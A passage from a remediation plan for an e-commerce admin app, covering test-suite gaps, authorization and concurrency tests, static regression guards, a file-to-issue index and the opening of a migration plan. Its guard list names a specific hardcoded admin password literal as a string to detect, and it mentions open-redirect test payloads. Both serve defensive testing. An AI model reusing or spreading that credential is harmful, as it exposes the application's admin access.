2. Mark-as-read on opening the dropdown item (action, `staff` level, idempotent upsert).
3. Show an unread count computed as `pending items − read items`, not the raw pending count.
4. Keep the existing dropdown layout; only the count semantics and read markers change.
5. Optional email/WhatsApp digests are **out of scope** — document as a follow-up.
6. Do not introduce a websocket/push system (Safety Rule 8).

**Expected Behavior After Fix:**
The badge reflects *new* items since the last review; opening an item clears it.

**Dependencies:**
- **Depends on** PERF-001 (the notification queries are being consolidated there).

**Testing Requirements:**
- New payment → count increments.
- Open the item → count decrements, item marked read.
- Re-login → read state persists.
- Two users → independent read state.

**Acceptance Criteria:**
- [ ] Read-state table.
- [ ] Idempotent mark-as-read action.
- [ ] Unread count correct.
- [ ] No new dependency.
- [ ] Email/push documented as out of scope.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-012 — Settings have no validation against the storefront contract

**Priority:** P3
**Category:** E-commerce
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/validation/settings.ts
src/server/services/settings.service.ts
src/views/Settings.tsx
docs/ai-context/
```

**Problem Description:**
`store_settings` is a key-value store edited by `super_admin`. Values are validated only by a per-key Zod schema, if one exists. There is no registry of which keys the storefront actually consumes, no type/format enforcement for critical ones (phone, IBAN, currency), and no audit trail (DB-014 covers the last part).

**Current Implementation:**
`settings.service.ts:41-140` — `getAllSettings`, `getSetting`, `updateSetting`, `updateSettingsBatch`; upsert with `onConflictDoUpdate`. `Settings.tsx` renders inputs from a local list.

**Root Cause:**
Settings grew organically as `super_admin` needed a new value; no contract was defined between the admin and the storefront.

**Real-World Failure Scenario:**
An IBAN is entered with a typo. The storefront renders it on the checkout page and customers' transfers fail — a silent revenue outage that looks like a payment-provider problem.

**Required Implementation:**

1. Create `src/lib/store-settings-registry.ts`: a single typed map of known keys with `{ type: 'string'|'number'|'boolean'|'iban'|'phone'|'url', required: boolean, label, description, validator }`.
2. Validate every key against the registry in `updateSetting`/`updateSettingsBatch`; unknown keys are rejected (or accepted only with an explicit `allowUnknown` flag for forward compatibility — document the choice).
3. Format validators: IBAN (`^PK\d{2}[A-Z]{4}\d{16}$`), phone (`^(\+92|0)\d{9,10}$`), URL (`https:` only), currency (`^[A-Z]{3}$`).
4. Render the Settings page from the registry so labels, help text and validation are defined once.
5. Record the registry in `docs/ai-context/` as the admin↔storefront contract, with a note that the storefront must read from the same keys.
6. Combine with DB-014 so every settings change is audited with before/after values.

**Expected Behavior After Fix:**
A malformed IBAN, phone or URL cannot be saved; the Settings page and the storefront agree on the key set.

**Dependencies:**
- **Depends on** SEC-013 (super_admin enforcement), DB-014 (audit).

**Testing Requirements:**
- Invalid IBAN → `VALIDATION_ERROR` naming the field.
- Valid values save and round-trip.
- Unknown key → rejected (or flagged, per the documented decision).
- Settings page renders every registry key.

**Acceptance Criteria:**
- [ ] Registry module with types and validators.
- [ ] Enforced server-side.
- [ ] Page generated from the registry.
- [ ] Contract documented.
- [ ] Audited.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

## 6.7 Testing and Code Quality Issues

---

### TEST-001 — No test runner, no unit tests, no integration tests

**Priority:** P0
**Category:** Testing
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
package.json
src/scripts/test-*.ts
```

**Problem Description:**
`package.json` has no `"test"` script and no test framework. The nine `src/scripts/test-*.ts` files are **assertion scripts** that require a live database and print PASS/FAIL lines; they cannot run in CI without a provisioned database, they are not isolated, and they cannot be run per-file with a filter. There are zero unit tests for pure logic (DTOs, FSM, validation schemas, `safeInternalPath`, permissions) and zero integration tests with a controlled fixture.

**Current Implementation:**
`package.json` scripts: `db:verify`, `db:check`, `db:generate`, `db:migrate`, `db:seed`, `db:parity`, `db:integrity`, `auth:seed-admin`, `auth:test`, `imagekit:test`, `imagekit:lifecycle`, `backend:test`, `catalog:test`, `inventory:test`, `orders:test`, `backends:test`. No `test`.

**Root Cause:**
Testing was done through ad-hoc scripts against a developer database, which was adequate while the domain was small and became inadequate exactly when the business logic got subtle (BUG-007…BUG-012).

**Real-World Failure Scenario:**
Every fix in this plan is regression-prone: payment state, stock counters and coupon counts are three mutable systems coupled by transactions. Without automated tests, each fix risks silently breaking the previous one, and "Verified" becomes an opinion rather than a fact.

**Required Implementation:**

1. Adopt **Vitest** (fast, native ESM/TS, no config friction with `next`) as the single test runner. Add `"test": "vitest run"`, `"test:watch": "vitest"`, `"test:coverage": "vitest run --coverage"`.
2. Configure three projects within one config:
   - `unit` — pure functions: `src/lib/*` (dto, format, utils, safe-redirect, order-status, permissions), `src/server/validation/*`, `src/server/errors.ts`. No DB.
   - `integration` — services against a real Postgres (the CI service container from ARCH-009), using a per-test schema or transaction rollback. Test transactions, locks and constraints for real; do not mock Drizzle.
   - `component` (optional, later) — React Testing Library for the uploader and the permissions gating.
3. Establish fixture helpers: `createProduct`, `createOrder`, `createPayment` builders that insert through the repositories (not raw SQL) so fixtures stay valid as the schema evolves.
4. Port the existing `src/scripts/test-*.ts` assertions into integration tests incrementally; keep the scripts until parity is reached, then delete them (record the mapping in the PR).
5. Set coverage thresholds **after** the first green run — measure, then set a floor slightly below the measured value and raise it per phase. Do not invent a starting threshold.
6. Route `npm test` through CI (ARCH-009).

**Expected Behavior After Fix:**
`npm test` runs deterministic unit tests with no database and integration tests against an ephemeral Postgres; a regression in payment/stock/coupon logic fails the suite.

**Dependencies:**
- **Blocks** every "Verified" claim in this plan.
- **Related** ARCH-009, TEST-002…TEST-007.

**Testing Requirements:**
- `npm test` exits 0 on a clean checkout with no `.env`.
- Integration tests skip cleanly (not fail) when `DATABASE_URL` is absent, and run when present.
- A deliberately broken assertion fails the run.
- Runtime under a documented budget.

**Acceptance Criteria:**
- [ ] Vitest configured with `unit` and `integration` projects.
- [ ] `npm test` script exists.
- [ ] Fixture builders exist.
- [ ] At least the pure-logic modules covered.
- [ ] CI runs the suite.
- [ ] Existing scripts mapped to tests.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### TEST-002 — No authorization matrix test

**Priority:** P1
**Category:** Testing
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/actions/*.ts
src/server/services/*.ts
src/app/api/**/route.ts
src/app/**/page.tsx
```

**Problem Description:**
There are 12 action modules with 51 distinct `requiredRole` declarations plus 11 services with their own `assertRole` calls, and **no test asserts the resulting matrix**. SEC-004 and SEC-013 exist precisely because a role threshold drifted unnoticed.

**Current Implementation:**
Authorization is declared per action and re-asserted per service; nothing enumerates the effective requirement.

**Root Cause:**
Role checks were written as inline literals with no registry, so there is nothing to test against.

**Real-World Failure Scenario:**
A developer adds `refundPaymentAction` with `requiredRole: "staff"` (a copy-paste slip). Nothing fails. A staff member refunds an order. The error surfaces in an audit months later.

**Required Implementation:**

1. Build a declarative table in the test file (not in production code) enumerating `{ action, minRole }` for every exported action, cross-checked against the source by reading the module's config — the test must fail if an action's `requiredRole` differs from the table.
2. For each action, assert three cases: below-threshold role → `FORBIDDEN`; threshold role → allowed; unauthenticated → `UNAUTHORIZED`.
3. Do the same for the remaining route handlers and for every `page.tsx` (unauthenticated → redirect; `customer` role → forbidden).
4. Assert the capability matrix in §6.1.1 and `src/lib/permissions.ts` (BUG-026) agree — one source, three consumers (server action, server service, client UI).
5. Run the whole matrix in CI on every PR (fast: no DB needed if identity is injected through a test seam; use a real DB only for the services that need one).

**Expected Behavior After Fix:**
Changing any role threshold without updating the matrix fails the build; privilege escalation by copy-paste becomes impossible.

**Dependencies:**
- **Depends on** TEST-001, SEC-004, SEC-013, ARCH-001.
- **Related** BUG-026.

**Testing Requirements:**
- The matrix test runs in under a documented budget.
- Deliberately lowering a `requiredRole` fails the test.
- Deliberately removing an `assertRole` from a service fails the test.
- All four roles × all actions covered.

**Acceptance Criteria:**
- [ ] Declarative matrix test exists.
- [ ] Source is cross-checked, not hardcoded twice.
- [ ] Route handlers and pages covered.
- [ ] Client capability table asserted equal.
- [ ] CI gate.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### TEST-003 — No DTO / schema parity tests

**Priority:** P1
**Category:** Testing
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/lib/dto.ts
src/db/schema/*.ts
supabase/migrations/*.sql
src/scripts/verify-schema-parity.ts
```

**Problem Description:**
`npm run db:parity` exists (`src/scripts/verify-schema-parity.ts`) but compares only tables and columns — it demonstrably missed the unique-constraint drift (DB-001, DB-002), the index drift (DB-003), and the CHECK drift (DB-004). Separately, `src/lib/dto.ts` has 25 `as any` casts and fabricates values (BUG-029); nothing tests that a DB row maps to the expected view model.

**Current Implementation:**
`verify-schema-parity.ts` (read at baseline) compares table/column presence. `dto.ts` is untested.

**Root Cause:**
Parity was scoped to "does the column exist", which is the weakest possible check; DTO correctness was verified by looking at the screen.

**Real-World Failure Scenario:**
See DB-001: the app believed `email` was unique for months. A DTO regression (e.g. dropping a field while refactoring) silently blanks a column in the UI and nobody notices until a customer complains.

**Required Implementation:**

1. Extend `db:parity` to compare: columns + types + nullability, primary keys, unique constraints, CHECK constraints, foreign keys (with `ON DELETE`), and indexes (name, columns, uniqueness, predicate).
2. Add a DTO snapshot test suite: one representative DB row per entity (product list, product detail, order list, order detail, payment list, payment detail, customer, coupon, shipping, engraving, settings) → assert the exact output object. Snapshots make any accidental field drop or fabrication visible in review.
3. Add explicit **anti-fabrication** assertions: for each DTO, assert that no field is populated when the source value is absent (this is what would have caught `by: "Admin"`, `customerType: "registered"`, `/products/scrubs-teal.jpg`, `/proofs/receipt-1.jpg`).
4. Type-level test: the DTO output must satisfy the `lib/types.ts` interface with no `as any` — add an ESLint rule or a `tsd`-style assertion for the DTO module specifically, and record a plan to remove the 25 casts.

**Expected Behavior After Fix:**
Any schema drift or DTO regression fails CI before it reaches the app.

**Dependencies:**
- **Depends on** TEST-001, BUG-029, DB-001…DB-004.
- **Related** DB-016.

**Testing Requirements:**
- Dropping a Drizzle constraint fails parity.
- Changing a DTO field fails the snapshot with a readable diff.
- Removing a source value from a fixture fails the anti-fabrication assertion.
- Parity runs in CI (ARCH-009).

**Acceptance Criteria:**
- [ ] Parity covers constraints and indexes.
- [ ] DTO snapshots for 11 entities.
- [ ] Anti-fabrication assertions.
- [ ] Cast count tracked and reduced.
- [ ] CI gate.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### TEST-004 — No concurrency tests for the stock/payment/coupon invariants

**Priority:** P0
**Category:** Testing
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/server/services/payment.service.ts
src/server/services/inventory.service.ts
src/server/services/coupon.service.ts
```

**Problem Description:**
The system's correctness depends entirely on transactional guarantees that no test exercises: `SELECT … FOR UPDATE` ordering (BUG-004), idempotent stock commitment (ADR 018), coupon redemption under a row lock (ADR 021), and payment approval racing a cancellation. A single-threaded test can never reveal these bugs.

**Current Implementation:**
`src/scripts/test-inventory-backend.ts` and `test-orders-customers-payments.ts` run sequential assertions. No concurrent execution, no deadlock assertions, no `SKIP LOCKED` verification.

**Root Cause:**
Concurrency testing requires orchestration (parallel promises against a real DB) and is harder to write than a happy-path assertion.

**Real-World Failure Scenario:**
The system passes every manual test and then loses stock integrity the first time two staff work simultaneously — the exact condition this plan's BUG-004/BUG-007/BUG-009 fixes target. Without a test, the fixes cannot be proven.

**Required Implementation:**

1. Integration tests that fire **N concurrent** operations with `Promise.allSettled` and assert both the outcome distribution and the final DB state:
   - 10 concurrent orders for the last 1 unit → exactly 1 succeeds, 9 receive `CONFLICT`, `quantity_reserved` equals 1.
   - 2 concurrent orders with the same two variants in opposite order, 100 iterations → zero `40P01` deadlocks after BUG-004.
   - 5 concurrent `approvePayment` for the same payment → exactly one `sale` movement.
   - 5 concurrent `createOrder` with the same coupon at `usage_limit = 1` → exactly 1 succeeds, `usage_count = 1`.
   - Concurrent cancel + approve on the same order → one wins, the other is rejected, state is coherent.
2. Assert the **lock order** explicitly: query `pg_locks` during the test (or use a deliberate ordering test with two transactions and a timeout) to prove no deadlock.
3. Run the suite against the CI Postgres (ARCH-009) with a per-test schema so parallel test files cannot interfere.
4. Keep iteration counts modest (50–100) so the suite stays under a documented budget.

**Expected Behavior After Fix:**
Any regression in locking, idempotency or isolation fails a test deterministically.

**Dependencies:**
- **Depends on** TEST-001, BUG-004, BUG-007, BUG-009, DB-001.
- **Related** PERF-009 (pool interaction).

**Testing Requirements:**
- Each scenario above passes 20 consecutive runs without flaking.
- Deliberately removing `FOR UPDATE` makes the concurrency test fail.
- Deliberately removing `commitOrderSale`'s idempotency guard makes the approval test fail.
- Suite runtime recorded.

**Acceptance Criteria:**
- [ ] Five concurrency scenarios implemented.
- [ ] Lock-order assertion.
- [ ] Per-test schema isolation.
- [ ] Non-flaky over 20 runs.
- [ ] CI gate.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### TEST-005 — No end-to-end or security verification suite

**Priority:** P1
**Category:** Testing
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
.github/workflows/    (absent)
src/app/**
```

**Problem Description:**
No E2E or security suite exists. The 14 SEC issues in this plan were found by reading code; nothing prevents their reintroduction. `npm run auth:test` covers two sign-in cases only, and `src/app/api/auth/verify` (SEC-001) was itself a "test" shipped into production.

**Current Implementation:**
No Playwright/Puppeteer dependency; no HTTP security test.

**Root Cause:**
Testing was manual and in-app.

**Real-World Failure Scenario:**
SEC-001 is "fixed" by deleting the file, then reintroduced in a later refactor because someone needs a quick auth check. No test notices until the endpoint is found in the wild.

**Required Implementation:**

1. Add **Playwright** for E2E (one dependency, justified: it is the standard for Next.js and can assert on redirects and cookies, which unit tests cannot).
2. E2E flows (happy path, seeded data):
   - Login → dashboard → products → create product → verify it appears.
   - Order detail → approve payment → stock decrements → dashboard revenue updates.
   - Cancel an order → stock returns, payment failed, coupon released.
   - Login with `?from=` open-redirect payload → lands on `/`.
3. Security assertions (HTTP level, no browser):
   - `GET /api/auth/verify` → 404.
   - Unauthenticated `GET /api/inventory` → 401.
   - `customer` role → 403 on every mutating action (reinforces TEST-002 at the HTTP layer).
   - Sign-in rate limit → 429 after N attempts.
   - Response headers present (SEC-010).
   - No `X-Powered-By`.
4. Run E2E against a preview build with a seeded ephemeral database in CI; keep the suite to the flows above (do not build a full regression suite).
5. Add a `SECURITY.md`-style checklist in `docs/ai-context/` recording that the 14 SEC items are verified by named tests.

**Expected Behavior After Fix:**
Every critical security property and the three money/stock flows are proven by an automated test that runs in CI.

**Dependencies:**
- **Depends on** TEST-001, ARCH-009, SEC-001…SEC-014.

**Testing Requirements:**
- E2E suite green on a clean seeded DB.
- Deliberately re-adding `/api/auth/verify` fails the security suite.
- Deliberately removing a security header fails.
- Suite runtime recorded; flake rate measured over 10 runs.

**Acceptance Criteria:**
- [ ] Playwright configured.
- [ ] Four E2E flows.
- [ ] Six security assertions.
- [ ] Runs in CI against a preview build.
- [ ] Coverage mapped to SEC IDs.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### TEST-006 — No static regression guards

**Priority:** P2
**Category:** Testing
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
scripts/            (new)
package.json
.github/workflows/
```

**Problem Description:**
Several classes of defect in this plan are trivially detectable by static checks but were not, which is why they survived: hardcoded secrets, `redirect()` inside actions, `as any` count growth, unused dependencies, doc references to non-existent files, and permissive proxy matchers.

**Current Implementation:**
Only `tsc --noEmit` and `eslint .`, both of which pass at the baseline despite 105 issues.

**Root Cause:**
Lint rules were configured for style, not for this project's specific hazards.

**Real-World Failure Scenario:**
SEC-002's password literal returns via a copy-pasted script; SEC-008's open redirect returns via a new `router.push(params.get(...))`; the `as any` count grows from 55 to 150 as DTOs are patched. No gate stops any of it.

**Required Implementation:**

Add `scripts/check-guards.mjs` (Node, no dependency) with these checks, wired into `npm run lint` and CI:

| Guard | Rule |
|---|---|
| G1 | No occurrence of `Admin@ScrubX2026` or a 64-hex literal in `src/` |
| G2 | No `redirect(` inside `src/actions/**` or `src/app/api/**` |
| G3 | No `requiredRole: null` in `src/actions/**` |
| G4 | No `NEXT_REDIRECT` string returned from a catch block |
| G5 | `as any` count in `src/lib/dto.ts` ≤ a recorded baseline (fails on increase) |
| G6 | Every path referenced in `docs/ai-context/*.md` exists |
| G7 | No `dangerouslySetInnerHTML` outside an allowlist file |
| G8 | No `console.log` of an object in `src/server/**` (must use the logger) |
| G9 | No dependency in `package.json` with zero references in `src/` (report, not fail) |
| G10 | Proxy matcher contains no `.*\.(jpg\|png\|…)` negative lookahead |

Each guard prints the offending file:line. Failures are blocking; G9 is advisory.

**Expected Behavior After Fix:**
The specific regressions this plan eliminates cannot silently return.

**Dependencies:**
- **Depends on** ARCH-008, ARCH-009, ARCH-010.
- **Related** SEC-001/SEC-002/SEC-008, ARCH-001.

**Testing Requirements:**
- Each guard fails when its violation is deliberately reintroduced.
- Guards run in under a documented budget.
- CI blocks on failure.
- No false positives on the current tree.

**Acceptance Criteria:**
- [ ] Script with G1–G10.
- [ ] Wired into lint and CI.
- [ ] Each guard proven by a deliberate violation.
- [ ] G9 advisory only.
- [ ] Runtime recorded.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### TEST-007 — No load or capacity test

**Priority:** P3
**Category:** Testing
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
scripts/            (new)
```

**Problem Description:**
There is no measurement of the app under concurrent staff usage, so the pool sizing (PERF-009), query-count targets (PERF-001…PERF-003) and lock contention (BUG-004) cannot be validated. Every performance claim in this plan is a *target*, not a measurement.

**Current Implementation:**
None.

**Root Cause:**
Performance was never measured; the app is small enough that development felt fine.

**Real-World Failure Scenario:**
A flash sale brings 15 concurrent staff sessions. The pool saturates, `connect_timeout` fires, and orders fail during the busiest hour. Without a load test the failure mode is discovered in production.

**Required Implementation:**

1. Add a load script using `autocannon` (single dev dependency) or a plain `node:http` harness if dependency-free is preferred. Record the choice.
2. Scenarios: 10 concurrent sessions over 5 minutes performing a realistic mix (60% list views, 20% order detail, 15% status updates, 5% payment approvals).
3. Record: p50/p95/p99 latency per route, query count per request (via the harness from §9.6), pool saturation events, error rate, deadlock count.
4. Establish a documented budget after the first run — **do not invent numbers now**. The test then fails if a later change exceeds the budget by a stated margin.
5. Run against staging with production-like data volume, never production.

**Expected Behavior After Fix.**
There is a reproducible capacity number and a regression guard for performance.

**Dependencies:**
- **Depends on** PERF-001…PERF-009, TEST-001.
- **Related** PERF-009.

**Testing Requirements:**
- Script runs against staging and produces a report.
- Baseline recorded in `docs/ai-context/IMPLEMENTATION_LOG.md`.
- A deliberately degraded query (e.g. removing an index) shows a measurable regression.

**Acceptance Criteria:**
- [ ] Load script exists.
- [ ] Four metrics collected.
- [ ] Baseline recorded (real numbers, not invented).
- [ ] Budget defined from the baseline.
- [ ] Never run against production.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

# 7. Affected File Reference Index

Reverse map: every file this plan touches, and which issues touch it. Use it to detect conflicts before starting work — if two issues appear in one row, implement them in the same change set (§12 explains why).

## 7.1 Application entry, config and proxy

| File | Issues |
|---|---|
| `next.config.ts` | SEC-010, PERF-010 |
| `package.json` | SEC-001, ARCH-007, ARCH-008, ARCH-009, TEST-001, TEST-006, TEST-007 |
| `src/proxy.ts` | SEC-001, SEC-008, SEC-011, BUG-032, ARCH-010 |
| `.env.example` | SEC-002, SEC-003 |
| `README.md` | ARCH-008, ARCH-010 |
| `.github/workflows/` (new) | ARCH-009, TEST-005, TEST-006 |
| `scripts/check-guards.mjs` (new) | TEST-006 |
| `.agent/skills/project-context-management/SKILL.md` | ARCH-010 |

## 7.2 Authentication and authorization

| File | Issues |
|---|---|
| `src/lib/auth.ts` | SEC-003 |
| `src/lib/auth-guard.ts` | SEC-004, SEC-005, ARCH-001, SEC-013 |
| `src/server/auth.ts` | SEC-004, ARCH-001, BUG-032, SEC-013 |
| `src/server/action-client.ts` | ARCH-003, SEC-011, DB-014, ARCH-006 |
| `src/server/errors.ts` | SEC-012, BUG-004, ARCH-006 |
| `src/lib/safe-redirect.ts` (new) | SEC-008 |
| `src/lib/permissions.ts` (new) | BUG-026, TEST-002 |
| `src/lib/order-status.ts` (new) | ARCH-005, BUG-012 |
| `src/lib/time.ts` (new) | BUG-034, BUG-027, BUG-028 |
| `src/server/rate-limit.ts` (new) | SEC-011, SEC-005 |
| `src/server/logger.ts` (new) | ARCH-006 |
| `src/app/api/auth/verify/route.ts` | SEC-001, SEC-002 (deleted) |
| `src/app/api/upload/auth/route.ts` | SEC-005, SEC-006, SEC-007, ARCH-001 |
| `src/app/api/inventory/route.ts` | ARCH-002 |
| `src/app/api/inventory/adjust/route.ts` | ARCH-002 |
| `src/app/api/inventory/movements/route.ts` | ARCH-002 |

## 7.3 Orders, payments, coupons (domain critical)

| File | Issues |
|---|---|
| `src/server/services/order.service.ts` | BUG-001, BUG-002, BUG-003, BUG-004, BUG-005, BUG-006, BUG-007, BUG-012, BUG-013, ARCH-005, ECOM-001, ECOM-009 |
| `src/server/services/payment.service.ts` | BUG-007, BUG-008, BUG-009, BUG-010, BUG-011, DB-005, ECOM-006 |
| `src/server/services/inventory.service.ts` | BUG-004, BUG-010, BUG-011, DB-012, ECOM-002 |
| `src/server/services/coupon.service.ts` | BUG-007, DB-003, DB-007, BUG-030 |
| `src/server/repositories/order.repository.ts` | BUG-016, BUG-005, BUG-029, ECOM-010 |
| `src/server/repositories/payment.repository.ts` | BUG-029, PERF-005, ECOM-006, DB-013 |
| `src/server/repositories/coupon.repository.ts` | BUG-030, DB-003, DB-007, PERF-004 |
| `src/server/repositories/inventory.repository.ts` | BUG-004, BUG-015 |
| `src/server/validation/orders.ts` | BUG-002, BUG-006, BUG-013, ARCH-005 |
| `src/server/validation/payments.ts` | BUG-008, BUG-010, SEC-014 |
| `src/actions/orders.ts` | BUG-006, BUG-012, ECOM-009 |
| `src/actions/payments.ts` | BUG-008, BUG-009, BUG-010 |
| `src/views/OrderDetail.tsx` | BUG-006, BUG-010, BUG-029, ARCH-005, ECOM-002, ECOM-007 |
| `src/views/Orders.tsx` | BUG-016, BUG-023, BUG-024, BUG-033, ECOM-009 |
| `src/views/Payments.tsx` | SEC-014, ECOM-006 |
| `src/views/Coupons.tsx` | BUG-030 |
| `src/app/orders/page.tsx` | BUG-023, BUG-033 |
| `src/app/orders/[id]/page.tsx` | PERF-012 |
| `src/app/payments/page.tsx` | BUG-033 |
| `src/app/coupons/page.tsx` | BUG-033 |

## 7.4 Catalog, inventory, media

| File | Issues |
|---|---|
| `src/server/services/product.service.ts` | BUG-017, BUG-018, BUG-019, BUG-021, BUG-022, SEC-009 |
| `src/server/repositories/product.repository.ts` | BUG-014, BUG-015, PERF-003, PERF-005, BUG-029 |
| `src/server/validation/catalog.ts` | BUG-014, BUG-018, BUG-019, BUG-021 |
| `src/lib/dto.ts` | BUG-016, BUG-029, SEC-014, BUG-024, BUG-031, TEST-003 |
| `src/lib/imagekit-upload.ts` | SEC-005, SEC-006, SEC-007 |
| `src/lib/imagekit-url.ts` | SEC-014, PERF-010 |
| `src/lib/imagekit.ts` | SEC-007 |
| `src/actions/media.ts` | SEC-006, SEC-007, SEC-009, SEC-012, ARCH-001 |
| `src/server/media/validate-image-bytes.ts` (new) | SEC-007 |
| `src/components/shared/image-upload.tsx` | SEC-006, BUG-017, PERF-007, PERF-010, BUG-021 |
| `src/views/ProductForm.tsx` | BUG-017, BUG-018, BUG-019, BUG-021, PERF-011 |
| `src/views/Products.tsx` | BUG-015, BUG-022, BUG-023, BUG-033 |
| `src/views/ProductView.tsx` | PERF-010 |
| `src/views/Categories.tsx` | BUG-020 |
| `src/views/Inventory.tsx` | BUG-033 |
| `src/app/products/page.tsx` | BUG-023, BUG-033 |
| `src/app/products/[id]/page.tsx`, `.../edit/page.tsx`, `.../new/page.tsx` | PERF-012 |
| `src/app/inventory/page.tsx`, `src/app/categories/page.tsx` | BUG-033 |
| `src/data/mock.ts`, `src/data/store.tsx` | ARCH-004 (deleted) |

## 7.5 Customers, settings, shell

| File | Issues |
|---|---|
| `src/server/services/customer.service.ts` | BUG-025, ECOM-004, ECOM-010 |
| `src/server/repositories/customer.repository.ts` | BUG-031, PERF-004, PERF-005, DB-001 |
| `src/server/repositories/settings.repository.ts` | SEC-013, ECOM-012 |
| `src/server/services/settings.service.ts` | SEC-013, ECOM-012 |
| `src/actions/settings.ts` | SEC-013, ECOM-012 |
| `src/server/validation/settings.ts` | ECOM-012 |
| `src/lib/store-settings-registry.ts` (new) | ECOM-012 |
| `src/views/CustomerDetail.tsx` | BUG-025, ECOM-004, ECOM-010 |
| `src/views/Customers.tsx` | BUG-023, BUG-033 |
| `src/views/Settings.tsx` | ECOM-012 |
| `src/app/customers/page.tsx`, `src/app/customers/[id]/page.tsx` | BUG-023, BUG-033, PERF-012 |
| `src/app/settings/page.tsx` | SEC-013, ECOM-012 |
| `src/app/layout.tsx` | PERF-001, BUG-034, BUG-026, SEC-013 |
| `src/app/page.tsx` | PERF-002, BUG-027, BUG-028 |
| `src/app/error.tsx`, `src/app/global-error.tsx` (new) | SEC-012 |
| `src/views/Dashboard.tsx` | BUG-027, BUG-028, BUG-034, PERF-008 |
| `src/app/login/page.tsx`, `src/views/Login.tsx` | SEC-008, SEC-012, BUG-032 |
| `src/components/layout/{app-shell,sidebar,topbar}.tsx` | BUG-026, SEC-013, BUG-023 |
| `src/components/ui/toast.tsx` | PERF-008, ARCH-007 |
| `src/components/shared/use-simulated-loading.ts` | BUG-034 (deleted) |
| `src/components/dashboard/revenue-chart.tsx` (new) | PERF-008 |

## 7.6 Database

| File | Issues |
|---|---|
| `supabase/migrations/20261105000000_initial_schema.sql` | reference only (never edited — new migrations added instead) |
| `supabase/migrations/20261105000001_phase3_schema_refinements.sql` | reference only |
| `supabase/migrations/2026XXXXXXXX_*.sql` (new files) | DB-001…DB-014, ECOM-002, ECOM-008, ECOM-011 |
| `src/db/migrate.ts` | DB-015 |
| `src/db/index.ts` | PERF-009 |
| `src/db/schema/{customers,catalog,orders,payments,coupons,inventory,shipping,auth}.ts` | DB-001…DB-013 |
| `src/scripts/{create-admin,test-auth}.ts` | SEC-002 |
| `src/scripts/seed-database.ts` | SEC-014 |
| `src/scripts/verify-schema-parity.ts` | TEST-003, DB-016 |

## 7.7 Documentation

| File | Issues |
|---|---|
| `docs/ai-context/ARCHITECTURE.md` | ARCH-004, ARCH-010, ARCH-001, ARCH-006 |
| `docs/ai-context/AUTH_CONTEXT.md` | SEC-002, SEC-003, SEC-004, SEC-013, ARCH-001, ECOM-005 |
| `docs/ai-context/DATABASE_CONTEXT.md` | DB-002, DB-010, DB-016, PERF-009 |
| `docs/ai-context/DECISIONS.md` | BUG-004, SEC-004, SEC-005, ARCH-002 |
| `docs/ai-context/IMAGEKIT_CONTEXT.md` | SEC-005, SEC-006, SEC-007, SEC-009, BUG-021, BUG-022 |
| `docs/ai-context/IMPLEMENTATION_LOG.md` | ARCH-010, every completed phase |
| `docs/ai-context/PENDING_TASKS.md` | ARCH-004, ARCH-008, ARCH-010 |
| `docs/ai-context/PROJECT_OVERVIEW.md` | ARCH-004, ARCH-010 |

## 7.8 Conflict hotspots (implement together, not in separate passes)

| File | Issues that must share one change set | Why |
|---|---|---|
| `src/server/services/order.service.ts` | BUG-001, BUG-002, BUG-003, BUG-004, BUG-013 | All five edit the same `createOrder` validation/reservation block |
| `src/views/ProductForm.tsx` | BUG-017, BUG-018, BUG-019, BUG-021 | One payload-building block, sent twice (create + update) |
| `src/lib/dto.ts` | BUG-016, BUG-029, BUG-024 | One DTO module; the list/detail split changes signatures |
| `src/server/auth.ts` + `src/lib/auth-guard.ts` | SEC-004, ARCH-001 | Two stacks, one rule — must collapse in one step |
| `supabase/migrations/` | DB-002, DB-003, DB-004, DB-006 | Same tables/indexes; ordering matters (§8) |
| `src/actions/media.ts` + `src/components/shared/image-upload.tsx` | SEC-009, BUG-017 | Removing the action requires moving both call sites |

---

# 8. Database Migration Plan

## 8.1 Principles

1. **Additive first.** No `DROP COLUMN`, no `DROP TABLE`, no rename without a two-step (add new → backfill → switch reads → drop later). Existing records are preserved (Safety Rule 4).
2. **Pre-check before constrain.** Every unique index or CHECK is preceded by a detection query and a documented cleanup. Never assume the constraint will apply cleanly.
3. **`CONCURRENTLY` for indexes on live tables.** Requires the runner change (DB-015).
4. **`NOT VALID` → `VALIDATE` for CHECK constraints** on populated tables: the first statement takes a brief `ACCESS EXCLUSIVE` but does not scan; the validation then scans under a weaker lock that permits reads and writes.
5. **One migration file per concern**, named `<timestamp>_<slug>.sql`, with a header comment containing: purpose, transaction mode, required pre-checks, rollback steps.
6. **Never edit an applied migration.** Add a new one (the runner will enforce checksums after DB-015).

## 8.2 Read-only pre-flight queries (run before writing any migration)

Run against the **target** database. Store the output with the migration. Every one of these is required evidence — do not skip and do not fabricate results.

| ID | Purpose | SQL |
|---|---|---|
| Q1 | Duplicate customers by normalized email (DB-001) | `SELECT lower(trim(email)) AS norm, count(*) AS n, array_agg(id) AS ids FROM customers GROUP BY 1 HAVING count(*) > 1 ORDER BY n DESC;` |
